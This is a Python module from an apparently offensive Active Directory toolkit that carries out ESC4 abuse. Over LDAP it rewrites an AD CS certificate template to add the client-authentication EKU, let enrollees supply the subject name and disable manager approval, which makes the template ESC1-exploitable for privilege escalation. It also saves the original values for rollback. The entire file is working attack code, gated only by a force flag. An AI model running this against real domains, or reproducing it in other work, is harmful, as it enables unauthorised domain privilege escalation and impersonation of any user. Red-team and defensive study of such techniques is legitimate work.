"""AD CS template modification (ESC4 abuse) with rollback capture.

Given WriteProperty on a certificate template, flips the template into an
ESC1-vulnerable state (client-authentication EKU, ENROLLEE_SUPPLIES_SUBJECT
name flag, low-privilege enroll rights). Records the original attribute
values so `adaf-attack cleanup` can restore them.
"""

from __future__ import annotations

import json
from typing import Any

from ldap3 import MODIFY_REPLACE, SUBTREE
from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

TEMPLATE_ATTRS = [
    "distinguishedName",
    "displayName",
    "pKIExtendedKeyUsage",
    "msPKI-Certificate-Name-Flag",
    "msPKI-Enrollment-Flag",
    "msPKI-Certificate-Application-Policy",
    "nTSecurityDescriptor",
]

CLIENT_AUTH_EKU = "1.3.6.1.5.5.7.3.2"
ENROLLEE_SUPPLIES_SUBJECT = 0x1  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT


@register_capability(
    id="template-mod",
    summary="Flip AD CS template to ESC1-vulnerable with rollback registration",
    category="privilege-escalation",
    tags=("adcs", "esc4", "template", "rollback"),
    destructive=True,
)
class TemplateMod:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        template = kwargs.get("template")
        if not template:
            raise RuntimeError("Pass -P template=<template-name>.")
        if not force:
            raise RuntimeError("template-mod modifies AD state; pass --force to run.")

        conn, base_dn, config_nc = ldap_connect(target)
        templates_dn = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{config_nc}"
        console.print(f"[bold]template-mod[/bold] template={template}")

        conn.search(
            templates_dn,
            f"(&(objectClass=pKICertificateTemplate)(cn={template}))",
            search_scope=SUBTREE,
            attributes=TEMPLATE_ATTRS,
        )
        if not conn.entries:
            raise RuntimeError(f"template not found: {template}")
        entry = conn.entries[0]
        dn = str(entry.distinguishedName)

        original: dict[str, Any] = {
            "pKIExtendedKeyUsage": list(entry["pKIExtendedKeyUsage"].values or [])
            if entry["pKIExtendedKeyUsage"]
            else [],
            "msPKI-Certificate-Name-Flag": int(entry["msPKI-Certificate-Name-Flag"].value)
            if entry["msPKI-Certificate-Name-Flag"]
            else 0,
            "msPKI-Enrollment-Flag": int(entry["msPKI-Enrollment-Flag"].value)
            if entry["msPKI-Enrollment-Flag"]
            else 0,
        }

        # Build target values: client-auth EKU + enrollee-supplies-subject.
        new_ekus = sorted({*original["pKIExtendedKeyUsage"], CLIENT_AUTH_EKU})
        new_name_flag = original["msPKI-Certificate-Name-Flag"] | ENROLLEE_SUPPLIES_SUBJECT
        # Force manager-approval off (bit 0x02) if it was set.
        new_enrollment_flag = original["msPKI-Enrollment-Flag"] & ~0x2

        changes = {
            "pKIExtendedKeyUsage": [(MODIFY_REPLACE, new_ekus)],
            "msPKI-Certificate-Name-Flag": [(MODIFY_REPLACE, [new_name_flag])],
            "msPKI-Enrollment-Flag": [(MODIFY_REPLACE, [new_enrollment_flag])],
        }
        ok = conn.modify(dn, changes)
        modify_result = str(conn.result)

        result: dict[str, Any] = {
            "template": template,
            "dn": dn,
            "ok": bool(ok),
            "original": original,
            "applied": {
                "pKIExtendedKeyUsage": new_ekus,
                "msPKI-Certificate-Name-Flag": new_name_flag,
                "msPKI-Enrollment-Flag": new_enrollment_flag,
            },
            "ldap_result": modify_result,
        }

        rollback_file = session.path(f"template-mod-{template}.rollback.json")
        rollback_file.write_text(json.dumps({"dn": dn, "attrs": original}, indent=2), encoding="utf-8")

        if ok:
            session.register_cleanup(
                {
                    "kind": "template-mod",
                    "target": dn,
                    "artifact": str(rollback_file),
                    "rollback": (
                        "LDAP MODIFY_REPLACE the three saved attributes back to their original values "
                        "recorded in the rollback file."
                    ),
                }
            )
            console.print(f"[green]LDAP MODIFY ok[/green]  {dn}")
        else:
            console.print(f"[red]LDAP MODIFY failed[/red]  {modify_result}")

        conn.unbind()

        node = f"TEMPLATE@{template.upper()}@{target.domain.upper()}"
        graph.add_node(node, "Template", name=template, esc4_modified=bool(ok))
        graph.add_edge(node, node, "TemplateModified")

        out = session.path("template-mod.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "template-mod.complete",
            template=template,
            ok=bool(ok),
        )
        return result
